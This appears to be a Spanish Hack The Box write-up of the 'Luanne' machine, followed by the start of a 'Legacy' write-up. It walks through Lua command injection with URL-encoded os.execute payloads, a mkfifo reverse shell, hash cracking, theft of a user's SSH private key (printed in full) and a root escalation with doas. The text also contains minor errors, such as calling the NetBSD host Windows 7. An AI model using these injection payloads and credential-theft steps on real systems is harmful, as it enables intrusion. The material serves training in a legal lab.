&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80,9001 10.10.10.218 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:33 GMT
Nmap scan report for 10.10.10.218
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
|_http-title: Error response
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.40 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver que nmap nos reporta dos rutas validas &lt;code&gt;robots&lt;/code&gt; y &lt;code&gt;weather&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina &lt;code&gt;Windows 7&lt;/code&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 8.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;nginx 1.19.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9001&lt;/td&gt;
      &lt;td&gt;TOR-ORPORT&lt;/td&gt;
      &lt;td&gt;Medusa httpd 1.12&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.218
http://10.10.10.218 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[nginx/1.19.0], IP[10.10.10.218], Title[401 Unauthorized], WWW-Authenticate[.][Basic], nginx[1.19.0]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta &lt;code&gt;unathorized&lt;/code&gt;, en otras palabras nos solicita credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.218:9001
http://10.10.10.218:9001 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Medusa/1.12], IP[10.10.10.218], Title[Error response], WWW-Authenticate[default][Basic]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a proceder Abrimos el servicio con el navegador y vemos que efectivamente nos solicita credenciales para ingresar y si intentamos usar credenciales por defecto no conseguimos ingresar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente que haremos sera dirigirnos a la ruta que nmap nos reporto &lt;code&gt;robots.txt&lt;/code&gt; y podemos ver que dentro la ruta &lt;code&gt;weather&lt;/code&gt; esta desabilitada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya que la ruta se reporta como desabilitada, vamos a suponer que existe y con &lt;code&gt;wfuzz&lt;/code&gt; vamos a tratar de fuzear por archivos dentro de esa ruta.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.218/weather/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.218/weather/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000007114:   200        1 L      12 W       90 Ch       &quot;forecast&quot;                                                                                                            
000015529:   404        7 L      11 W       153 Ch      &quot;hitb&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de aplicar fuzzing, vemos que existe una ruta &lt;code&gt;forecast&lt;/code&gt; que si la visualizamos tenemos acceso a una api &lt;code&gt;json&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En el mensaje vemos que nos pide usar un paramatro, para poder listar las ciudades.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos que se estan usando parametros, vamos a pasar la petición por &lt;code&gt;burpsuite&lt;/code&gt; para tratar de realizar inyecciones en la petición que nos permitan aprovecharnos de esta, asi que mandamos la petición con ayuda de &lt;code&gt;foxyproxy&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recibimos la petición en &lt;code&gt;burpsuite&lt;/code&gt; y la mandamos al repeater.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora trataremos de realizar una inyección en la petición incorporando una &lt;code&gt;'&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ocasionamos un&lt;code&gt;luaerror&lt;/code&gt;, asi que podemos tratar de ejecutar un comando con &lt;code&gt;lua&lt;/code&gt;, usando &lt;code&gt;os.execute()&lt;/code&gt;. y comentando la query.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En principio, la inyección parece fallar, pero vamos a volver a enviarlo esta vez haciendo &lt;code&gt;urlencode&lt;/code&gt; y esta vez si vemos la ejecución correctamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente que haremos sera entablarnos una &lt;code&gt;revershell&lt;/code&gt; a nuestra maquina usando &lt;code&gt;mkfifo&lt;/code&gt; para que si tenemos una versión distinta de &lt;code&gt;ncat&lt;/code&gt; evitar inconenientes, para ello podemos usar la pagina web de confianza de &lt;code&gt;pentestmonkey&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Enviamos la petición, modificando nuestra ip, puerto en escucha y sin olvidar urlencodear la petición.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y recibimos la conexión en nuestra maquina como el usuario &lt;code&gt;httpd&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.218.
Ncat: Connection from 10.10.10.218:65479.
sh: can't access tty; job control turned off
$ whoami
_httpd
$ hostname
luanne.htb
$ uname -a  
NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y vemos que si se corresponde a un &lt;code&gt;NetBSD&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora vamos a lista los procesos que se estan ejecutando en la maquina y obervamos una correspondiente al demonio de &lt;code&gt;httpd&lt;/code&gt;, por el puerto &lt;code&gt;3001&lt;/code&gt; que apunta a la ruta &lt;code&gt;weather&lt;/code&gt;similar a la que usamos para ganar acceso al sistema.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'&quot;
Enter host password for user '-X':

HTTP/1.1 500 Error
Content-Type: application/json

&amp;lt;br&amp;gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value

curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22id%22%29--%2B-&quot;
Enter host password for user '-X':

HTTP/1.1 500 Error
Content-Type: application/json

{&quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: listuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22whoami%22%29--%2B-&quot;
Enter host password for user '-X':

HTTP/1.1 500 Error
Content-Type: application/json

{&quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: list_httpd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Observamos que tambien podemos ejecutar comandos, pero como el mismo usuario, asi que no nos serviria hacerlo. Pero vemos que en la ejecución del comando incorpora distintos parametros y podemos ver a que corresponde en &lt;code&gt;NETBSD&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Encontramos un articulo que nos explica a detalle el funcionamiento de los parametros.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://man.netbsd.org/NetBSD-9.3/i386/httpd.8&quot;&gt;https://man.netbsd.org/NetBSD-9.3/i386/httpd.8&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Entre los parametros que se utiliza en la petición, podemos ver que &lt;code&gt;-u&lt;/code&gt;, permite la transformación de localizadores uniformes de recursos de la forma &lt;code&gt;/~user/&lt;/code&gt; en el directorio &lt;code&gt;~user/public_html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora podemos aprovecharnos de esto, para lista los recursos del directorio &lt;code&gt;r.michaels&lt;/code&gt;, pero como realiza una autenticación, necesitamos credenciales y si listamos los archivos ocultos de nuestro directorio actual, podemos ver un archivo de nombre &lt;code&gt;.htpasswd&lt;/code&gt; que al leerlo se nos reporta un usuario con una contraeña hasheada que podemos intentar crackerla con &lt;code&gt;john&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ls -la
total 20
drwxr-xr-x   2 root  wheel  512 Nov 25  2020 .
drwxr-xr-x  24 root  wheel  512 Nov 24  2020 ..
-rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
-rw-r--r--   1 root  wheel   78 Nov 25  2020 robots.txt
cat .htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de realizar el crackeo &lt;code&gt;john&lt;/code&gt;, nos reporta la contraseña en texto claro, asi que ahora que contamos con credenciales validar &lt;code&gt;webapi_user:iamthebest&lt;/code&gt;, podemos usarlas en la petición.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -s -X GET &quot;http://127.0.0.1:3001/~r.michaels/&quot; -u 'webapi_user:iamthebest'
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;/&amp;gt;
&amp;lt;style type=&quot;text/css&quot;&amp;gt;
table {
	border-top: 1px solid black;
	border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
&amp;lt;/style&amp;gt;
&amp;lt;title&amp;gt;Index of ~r.michaels/&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Index of ~r.michaels/&amp;lt;/h1&amp;gt;
&amp;lt;table cols=3&amp;gt;
&amp;lt;thead&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Name&amp;lt;th&amp;gt;Last modified&amp;lt;th align=right&amp;gt;Size
&amp;lt;tbody&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;../&quot;&amp;gt;Parent Directory&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 18:20&amp;lt;td align=right&amp;gt;1kB
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;id_rsa&quot;&amp;gt;id_rsa&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 16:52&amp;lt;td align=right&amp;gt;3kB
&amp;lt;/table&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta vez podemos listar el contenido del usuario &lt;code&gt;r.michaels&lt;/code&gt; y dentro vemos su &lt;code&gt;id_rsa&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora tal y como nos dice el articulo de &lt;code&gt;NETBSD&lt;/code&gt;, podemos hacer uso del paramtro &lt;code&gt;-G&lt;/code&gt; para ver el output.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -s -X GET &quot;http://127.0.0.1:3001/~r.michaels/id_rsa&quot; -u 'webapi_user:iamthebest' -G id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya con la &lt;code&gt;id_rsa&lt;/code&gt; al estar abierto el puerto &lt;code&gt;22&lt;/code&gt;, podemos conectarnos como &lt;code&gt;r.michaels&lt;/code&gt;, sin proporcionar contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nvim id_rsa
❯ chmod 600 id_rsa
❯ ssh -i id_rsa r.michaels@10.10.10.218
The authenticity of host '10.10.10.218 (10.10.10.218)' can't be established.
ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts.
Last login: Fri Sep 18 07:06:51 2020
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$ whoami
r.michaels
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visualizamos los archivos, del directorio y podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;backups     devel       public_html user.txt
luanne$ cat user.txt                                                                                                                                                                  
ea5f0ce6a917b0be1eabc7f9218febc0
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si listamos el directorio del usuario, obsevamos un directorio &lt;code&gt;backup&lt;/code&gt;, que dentro contiene un archivo tar encrpytado.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ ls
backups     devel       public_html user.txt
luanne$ cd backups/                                                                                                                                                                   
luanne$ ls 
devel_backup-2020-09-16.tar.gz.enc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora en &lt;code&gt;NETBSD&lt;/code&gt;, existe una herramienta para decsencriptar estos archivos que corresponde ah &lt;code&gt;netpgp&lt;/code&gt;. Si ejecutamos la herramienta nos muestra el panel de ayuda para poder ejecutarla correctamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ netpgp
NetPGP portable 3.99.17/[20101103]
All bug reports, praise and chocolate, please, to:
Alistair Crooks &amp;lt;agc@netbsd.org&amp;gt; c0596823
Usage: netpgp COMMAND OPTIONS:
netpgp  --help OR
        --encrypt [--output=file] [options] files... OR
        --decrypt [--output=file] [options] files... OR

        --sign [--armor] [--detach] [--hash=alg] [--output=file]
                [options] files... OR
        --verify [options] files... OR
        --cat [--output=file] [options] files... OR
        --clearsign [--output=file] [options] files... OR
        --list-packets [options] OR
        --version
where options are:
        [--cipher=&amp;lt;ciphername&amp;gt;] AND/OR
        [--coredumps] AND/OR
        [--homedir=&amp;lt;homedir&amp;gt;] AND/OR
        [--keyring=&amp;lt;keyring&amp;gt;] AND/OR
        [--numtries=&amp;lt;attempts&amp;gt;] AND/OR
        [--userid=&amp;lt;userid&amp;gt;] AND/OR
        [--maxmemalloc=&amp;lt;number of bytes&amp;gt;] AND/OR
        [--verbose]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de decsencriptar el archivo, vamos a traernoslo a nuestro equipo para descromprimirlo, como no cuenta con &lt;code&gt;python&lt;/code&gt;, usaremos &lt;code&gt;nc&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo descomprimimos y dentro vemos otro archivo &lt;code&gt;.htpasswd&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 devel_backup-2020-09-16.tar.gz   id_rsa
❯ file devel_backup-2020-09-16.tar.gz
devel_backup-2020-09-16.tar.gz: gzip compressed data, last modified: Tue Nov 24 09:18:51 2020, from Unix, original size modulo 2^32 12288
❯ tar -xf devel_backup-2020-09-16.tar.gz
❯ ls
 devel-2020-09-16   devel_backup-2020-09-16.tar.gz   id_rsa
❯ cd devel-2020-09-16
❯ ls
 webapi   www
❯ tree -fas
.
├── [         22]  ./webapi
│   └── [       7072]  ./webapi/weather.lua
└── [         38]  ./www
    ├── [         47]  ./www/.htpasswd
    └── [        378]  ./www/index.html

2 directories, 3 files
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al leer el archivo, vemos una contraeña &lt;code&gt;hasheada&lt;/code&gt;, pero que es distinta a la obtuvimos previamente. Asi con john vamos a intentar crackear este otro &lt;code&gt;hash&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash2
Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
littlebear       (webapi_user)
1g 0:00:00:00 DONE (2023-06-29 18:21) 7.142g/s 93257p/s 93257c/s 93257C/s gamboa..hello11
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos una nueva contraseña &lt;code&gt;littlebear&lt;/code&gt;, que curiosamente corresponde a la del usuario &lt;code&gt;root&lt;/code&gt;, pero para migrar no podemos hacer uso de &lt;code&gt;su root&lt;/code&gt;, ya que en &lt;code&gt;NETBSD&lt;/code&gt; lo hacemos usando el comando &lt;code&gt;doas&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ su root 
su: You are not listed in the correct secondary group (wheel) to su root.
su: Sorry: Authentication error
luanne$ doas sh
Password:
# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente solo debemos dirigirnos al directorio personal del usuario root y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; y asi habriamos concluido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# cd /root
# cat root.txt
7a9b5c206e8e8ba09bb99bd113675f66
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Thu, 29 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Luanne</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Luanne</guid>
        
        <category>NETBSD</category>
        
        <category>Api json explotation</category>
        
        <category>Lua Command Injection</category>
        
        <category>Abussing httpd Parameter</category>
        
        <category>Cracking Hashes</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Legacy - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Legacy&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; sencilla de dificultad facil, en la explotación vamos a repasar los conceptos para realizar una explotación manual de &lt;code&gt;eternal blue&lt;/code&gt; usando el &lt;code&gt;zzz_exploit.py&lt;/code&gt;, ademas de forma alternativa para explotar la maquina realizaremos una enumeración por &lt;code&gt;smb&lt;/code&gt; donde se nos reprotara que el servicio es vulnerable a el exploit &lt;code&gt;MS08_067&lt;/code&gt; el cual tambien explotaremos a traves de la creación de un &lt;code&gt;shellcode&lt;/code&gt; para asi obtener acceso como el usuario &lt;code&gt;adminsitrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Comenzaremos como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Legacy
❯ ls
 Legacy
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.4
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
